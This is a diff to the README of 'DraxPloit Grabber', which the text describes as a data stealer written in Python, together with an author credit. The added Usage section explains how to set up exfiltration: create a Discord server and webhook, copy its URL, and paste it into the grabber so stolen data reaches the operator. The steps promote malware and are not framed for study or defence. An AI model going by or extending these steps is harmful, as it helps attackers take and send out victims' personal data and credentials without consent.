@@ -26,6 +26,15 @@ Data Stealer written in **Python**
 5. Configure your file
 6. Enjoy!
 
+## Usage
+
+1. Create a Discord Server and enter your setting
+2. Go to "Integrations" and click on "Create Webhook"
+3. Set a webhook name and the specified text channel
+4. Copy the Webhook URL (!!!)
+5. Open DraxPloit Grabber and paste the webhook URL
+6. Customize your file and finish
+
 ## Authors
 
 * **Drax** - *DraxPloit Grabber* - [Drax](https://github.com/DraxFM)
